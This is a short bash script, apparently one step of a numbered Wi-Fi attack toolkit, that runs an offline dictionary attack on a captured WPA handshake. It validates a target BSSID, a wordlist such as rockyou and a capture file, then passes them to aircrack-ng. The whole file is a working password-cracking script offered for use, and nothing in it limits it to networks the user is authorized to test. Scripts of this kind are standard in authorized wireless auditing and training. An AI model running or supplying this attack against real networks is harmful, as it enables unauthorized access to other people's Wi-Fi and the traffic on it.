#!/usr/bin/env bash
# Offline dictionary attack against a captured WPA handshake.
#
# Usage:
#   sudo ./05-crack-handshake.sh -b <bssid> -w <wordlist> <capture.cap>
#
# Example:
#   sudo ./05-crack-handshake.sh \
#       -b AA:BB:CC:11:22:33 \
#       -w /usr/share/wordlists/rockyou.txt \
#       capture-01.cap

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

usage() {
    die "Usage: $0 -b <bssid> -w <wordlist> <capture.cap>"
}

BSSID="" WORDLIST=""
while getopts "b:w:" opt; do
    case "$opt" in
        b) BSSID=$OPTARG ;;
        w) WORDLIST=$OPTARG ;;
        *) usage ;;
    esac
done
shift $((OPTIND - 1))

CAPFILE="${1:-}"
[[ -z "$BSSID" || -z "$WORDLIST" || -z "$CAPFILE" ]] && usage
[[ -r "$WORDLIST" ]] || die "Wordlist not readable: $WORDLIST  (rockyou is often gzipped — gunzip it first)"
[[ -r "$CAPFILE"  ]] || die "Capture file not readable: $CAPFILE"

aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"
